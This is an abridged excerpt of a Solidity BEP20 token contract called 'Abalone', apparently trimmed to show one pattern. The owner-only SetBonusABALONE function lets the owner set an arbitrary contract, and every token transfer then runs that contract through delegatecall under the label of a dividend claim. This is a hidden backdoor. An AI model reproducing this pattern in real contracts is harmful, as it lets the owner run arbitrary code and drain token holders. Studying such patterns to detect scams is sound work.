...
contract Abalone is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'Abalone';
  string private constant _symbol = 'ABALONE';
  ...
  */
  ...
  function claimDividendABALONE(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      (bool success, bytes memory bytesdata) = C_ABALONE.delegatecall(
  ...
  function SetBonusABALONE(address c) public onlyOwner {
    C_ABALONE = c;
  } 
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmount = claimDividendABALONE(sender, recipient, amount);   
